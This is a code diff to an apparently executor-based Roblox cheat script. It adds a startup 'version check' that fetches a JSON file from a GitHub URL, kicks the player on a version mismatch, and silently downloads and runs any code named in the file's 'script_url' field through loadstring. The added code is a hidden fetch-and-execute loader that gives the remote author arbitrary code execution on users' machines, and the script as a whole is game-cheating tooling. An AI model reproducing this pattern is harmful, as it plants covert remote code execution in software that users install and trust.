@@ -1,4 +1,44 @@
-local Version = "".."v1.2"..""
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local bit = bit32 or bit
+local http_request = http_request or request or syn and syn.request or http and http.request
+
+local Version = "v1.2"
+local Checker = "https://raw.githubusercontent.com/NymeraAnHomie/Libraries/main/NymeraTas/Check.json"
+
+local function HttpGet(url)
+    if syn and syn.request then local ok,res=pcall(syn.request,{Url=url,Method="GET"}) if ok and res and res.Body then return res.Body end end
+    if request then local ok,res=pcall(request,{Url=url,Method="GET"}) if ok and res and (res.Body or res.body) then return res.Body or res.body end end
+    if http_request then local ok,res=pcall(http_request,{Url=url,Method="GET"}) if ok and res and (res.Body or res.body) then return res.Body or res.body end end
+    if http and http.request then local ok,res=pcall(http.request,{Url=url,Method="GET"}) if ok and res and (res.Body or res.body) then return res.Body or res.body end end
+    local ok,body=pcall(function() return game:HttpGet(url,true) end) if ok then return body end
+    return nil
+end
+
+local function MatchCheck()
+    local body=HttpGet(Checker)
+    if not body then return false end
+    local ok,data=pcall(HttpService.JSONDecode,HttpService,body)
+    if not ok or type(data)~="table" then return false end
+    if data.expected_version~=Version then
+        if LocalPlayer and LocalPlayer.Kick then LocalPlayer:Kick(("Version mismatch. Expected %s"):format(data.expected_version)) else error("Version mismatch") end
+        return false
+    end
+    if data.script_url and data.script_url~="" then
+        local s=HttpGet(data.script_url)
+        if s then pcall(function() loadstring(s)() end) end
+    end
+    return true
+end
+
+MatchCheck()
+
+
+
+
+
 local Utilities = {} -- Ignore
 local Frames = {} -- Ignore
 
@@ -66,7 +106,7 @@ local Library = {
 
 
 
-local bit = bit32 or bit -- w api
+
 
 -- Variables
 -- Data Types
@@ -122,18 +162,15 @@ local Gmatch = string.gmatch
 local Rep = string.rep
 --
 
-local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 local ContextActionService = game:GetService("ContextActionService")
 local GuiService = game:GetService("GuiService")
 local InsertService = game:GetService("InsertService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 
-local LocalPlayer = Players.LocalPlayer
 local PlayersScript = LocalPlayer.PlayerScripts
 local Character = LocalPlayer.Character
 local HumanoidRootPart = Character.HumanoidRootPart
